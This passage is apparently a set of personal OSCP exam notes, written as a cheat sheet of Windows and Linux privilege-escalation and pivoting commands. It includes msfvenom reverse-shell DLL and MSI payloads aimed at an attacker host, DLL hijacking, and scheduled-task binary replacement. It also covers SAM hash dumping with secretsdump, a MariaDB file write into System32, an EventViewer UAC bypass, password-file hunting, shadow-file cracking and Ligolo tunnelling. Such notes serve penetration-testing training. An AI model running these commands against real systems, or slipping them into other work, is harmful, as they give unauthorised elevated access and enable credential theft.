```powershell
PS C:> Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```

**Command Prompt:**

```powershell
C:\Users\steve> wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```

### DLL Hijacking

Read OSCP Notes !!

- Find Missing DLLs using Process Monitor, Identify a specific service which looks suspicious and add a filter.
- Check whether you have write permissions in the directory associated with the service.

```powershell
# Create a reverse-shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attaker-IP> LPORT=<listening-port> -f dll > filename.dll
```
- Copy it to victom machine and them move it to the service associated directory.(Make sure the dll name is similar to missing name)
- Start listener and restart service, you'll get a shell.


### SeShutdownPrivilege

If we have this Privilege then If any binary we are unable to start or Stop it is set as AUTO then we can reboot the system and it get executed afetr the reboot

```powershell
shutdown /r /t 0
```

### Powershell History

```powershell
PS C:\Users\dave> (Get-PSReadlineOption).HistorySavePath
```

Displayes the Powershell History files of `Dave` User

### Shedule Tasks

**Command Prompt:**

```powershell
C:\> schtasks /query /fo LIST /v #Displays list of scheduled tasks, Pickup any interesting one
#Permission check - Writable means exploitable!
icalcs "path"
#Wait till the scheduled task in executed, then we'll get a shell
```

**Powershell**

```powershell
PS > Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```
If you see any binary you have full access or Modify permissions then replace it and wait for some time to get the elevated shell !!

### InSecure GUI Apps:

```powershell
#Check the applications that are running from "TaskManager" and obtain list of applications that are running as Privileged user
#Open that particular application, using "open" feature enter the following
file://c:/windows/system32/cmd.exe 
```
### SAM and SYSTEM Files

```powershell
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system

C:\windows.old

#First go to c:
dir /s SAM
dir /s SYSTEM

impacket-secretsdump -system SYSTEM -sam SAM local
#always mention local in the command
#Now a detailed list of hashes are displayed
```

### Runas Saved Creds
```powershell
cmdkey /list #Displays stored credentials, looks for any optential users
#Transfer the reverseshell
runas /savecred /user:admin C:\Temp\reverse.exe
```

### Manul Files checking 

```powershell
Search for them 

findstr /si password *.txt 
findstr /si password *.xml 
findstr /si password *.ini 
 

#Find all those strings in config files. 
dir /s *pass* == *cred* == *vnc* == *.config* 
 

# Find all passwords in all files. 
findstr /spin "password" *.* 
findstr /spin "password" *.* 
 

In Files 

These are common files to find them in. They might be base64-encoded. So look out for that. 

c:\sysprep.inf 
c:\sysprep\sysprep.xml 
c:\unattend.xml 
%WINDIR%\Panther\Unattend\Unattended.xml 
%WINDIR%\Panther\Unattended.xml 
 

dir c:\*vnc.ini /s /b 
dir c:\*ultravnc.ini /s /b  
dir c:\ /s /b | findstr /si *vnc.ini


dir /s/b *.txt

windows tree:

tree /f /a
```

### .kdbx Files and other important Manual

```powershell
PS> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

# Xampp
PS> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

# pdf txt... files

PS> Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue 
```

### AlwaysInstallElevated

Upload any malicious .msi file and run that and get the system level access !!

```powershell
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f msi -o reverse.msi
```

**Target system: **
```powershell
PS C:\Users\Public\temp> msiexec /quiet /qn /i C:\Users\Public\temp\reverse.msi
```
Listen on 443 and get the Elevated Shell

### Windows PrivEsc Write Access

Suppose we are have read and write access to the Adminsitrator and we can alos read the Proof.txt flag but we are unable to get the shell This method will works there !!

Take an example we are `apache` [Low Priv] user and we have `SQL server` on it and that sql server have `Admistrative permissions` and we can Write the Files as `Admins` so Using the diaghub dll method we can get the Shell !!

First Create a Malicious `test.dll` file
```powershell
# msfvenom --platform windows --arch x64 -p windows/x64/shell_reverse_tcp LHOST=tun0 EXICFUNC=THREAD LPORT=443 -f dll -o test.dll
```
Now upload the [diaghub.exe] (https://github.com/xct/diaghub/releases/download/0.1/diaghub.exe) binary to the same location where the test.dll is there !!
looks like :

![image](https://github.com/kullaisec/OSCP/assets/99985908/5c642bf3-4de1-4eb6-83df-6b66c4889dcd)

Now go to the mysql service and try to place the `test.dll` on the `Windows\system32\` path ...

example
```sql
MariaDB [(none)]> select load_file('C:\\\\test\\temp\\test.dll') into dumpfile 'C:\\\\Windows\\System32\\test.dll';
```
you can see we are able to do this now `test.dll` file is in the `System32\` path !!

```powershell
PS C:\test\temp> .\diaghub.exe C:\test\temp test.dll
```

And listen on 443 we will get elevated shell !!

More methods reference : https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#diaghub

### UAC Bypass

Suppose you are part of Administrator Group But you are unable to perform commands as a High Level User then there may be chances of UAC interruption we can bypass that !!
```powershell
PS> whoami /all   --> Mandatory Label\Medium Mandatory Level
```

![image](https://github.com/kullaisec/OSCP/assets/99985908/87c89a83-8d16-4a31-98bd-6be51924ce51)

**Exploitation:**

Tool Github Link:  https://github.com/CsEnox/EventViewer-UACBypass

On target System: 

```powershell
PS > Import-Module .\Invoke-EventViewer.ps1
PS > Invoke-EventViewer 
[-] Usage: Invoke-EventViewer commandhere
Example: Invoke-EventViewer cmd.exe
```
replace the malicious Bianry and get the Elavted Access by bypassing the UAC !!

```powershell
PS > Invoke-EventViewer C:\Users\Public\temp\reverse.exe
[+] Running
[1] Crafting Payload                                                                         
[2] Writing Payload                                                                          
[+] EventViewer Folder exists                                                                
[3] Finally, invoking eventvwr 
```
After Exploitation:

![image](https://github.com/kullaisec/OSCP/assets/99985908/536fc075-092c-44d8-b8f9-70217e1db1bd)



## Linux PrivEsc:

Linux Environment set:
```powershell
python -c 'import pty; pty.spawn("/bin/bash")'
```
```powershell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```powershell
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
```
```powershell
export TERM=xterm-256color
```
```powershell
alias ll='clear ; ls -lsaht --color=auto'
```
Ctrl + Z [Background Process]
```powershell
stty raw -echo ; fg ; reset
```
```powershell
stty columns 200 rows 200
```

### Kernel Exploits:
```powershell
$ uname -a
```

→ Leaks kernel details search for exploits

SUID:
```powershell
$ find / -perm -u=s -type f 2>/dev/null
```
Capabilities:

```powershell
$ /usr/sbin/getcap -r / 2>/dev/null
```
go to gtfobins and exploit !!

Services Exploits:
```powershell
$ ps aux | grep "^root"
```
→ Enumerate the program version:
```powershell
$ <program> --version
$ <program> -v
```
→ Debian:
```powershell
$ dpkg -l | grep <program>
```

Port Forwarding:
```powershell
$ netstat -nl
```
→ if you found any 127.0.0.1 you can access via following command:
```powershell
$ ssh -R <local-port>:127.0.0.1:<target-port> <username>@<local-machine> 
```

Weak Permissions:
```powershell
$ ls -al /etc/shadow
```
crack using john :
```powershell
$ john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
```powershell
$ ls -al /etc/passwd
```
if writable create a new password with the openssl and replace with "x"

→ Backups
```powershell
$ ls -la /home/user
$ ls -la /
$ ls -la /tmp
$ ls -la /var/backups
```
#### always check .ssh folder

SUDO:
```powershell
$ sudo -l
```
Cron:
```powershell
$ cat /etc/crontab
```

## Ligolo Pivoting 

Example Network:


![image](https://github.com/kullaisec/OSCP/assets/99985908/2323c1ef-c63f-4c5e-a4fa-7dc0ae107622)

                      
Follow the commands correctly !!

→ Navigate to /home/kali/offsec/pivote
→ Trasfer the agent.exe file to Windows [target] machine.

Kali:
```powershell
# sudo ip tuntap add user $(whoami) mode tun ligolo
```
```powershell
# sudo ip link set ligolo up
```

You can see the interface ligolo is started !!

Now start the proxy !!!

/home/kali/offsec/pivote

```powershell
# ./proxy -selfcert
```
You can see our ligolo is working  and started at all interfaces on port 11601

Now go to the windows machine [target]
```powershell
PS> .\agent.exe -connect <KALI-IP>:11601 -ignore-cert
```


you will get session like this select session 1
```powershell
[Agent : OFFSEC\jess@CLIENT01] » ifconfig
```
see the internal IP and add route in our kali:
```powershell
# sudo ip route add 172.16.153.0/24 dev ligolo
```
Now go to the proxy ligolo and enter start command
```powershell
[Agent : OFFSEC\jess@CLIENT01] » start
```
We can add the listners to get the reverse shell back or you can trasfer files by adding the listners!!

For File trasfers always use port 80
```powershell
[Agent : OFFSEC\jess@CLIENT01] » listener_add --addr 0.0.0.0:9292 --to 127.0.0.1:80
```
```powershell
[Agent : OFFSEC\jess@CLIENT01] » listener_list
```

Now go to WEB01 machine and enter 
```powershell

WEB01 PS> iwr -uri http://CLEINT01-INTERNAL-172-subnet-IP/filename -Outfile filename
```
```powershell
sudo ip link delete ligolo
```
